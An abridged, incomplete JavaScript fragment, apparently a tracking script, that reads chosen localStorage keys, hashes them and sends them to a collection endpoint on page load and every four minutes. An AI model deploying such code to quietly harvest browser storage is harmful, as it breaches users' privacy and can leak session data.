(function (exoDynamicParams) {
  ...
  function generateHash(data) {
    ...
    for (let i = 0; i < joinedKeys.length; i++) {
      const char = joinedKeys.charCodeAt(i);
  ...
  function extractLocalData() {
    ...
    for (let i = 0; i < localStorage.length; i++) {
      ...
      if (keysToMonitor.indexOf(storageKey) !== -1) {
        extractedDataObj[storageKey] = localStorage.getItem(storageKey);
      }
    }
  ...
  function sendBackend(data) {
    const shaValue = generateHash(data);
    const endpoint = "https://myapi.com/api/collect";
    ...
    httpRequest.onload = function () {
      if (httpRequest.status === 200) {
        ...
        console.error("Failed transmission. Status code:" + httpRequest.status);
      }
    };
  ...
  document.addEventListener("DOMContentLoaded", function () {
    collectData();
    setInterval(collectData, 4 * 60 * 1000);
  });
  ...
  window.jshook = {};
  window.jshook.collectData = collectData;
  !function () {
    try {
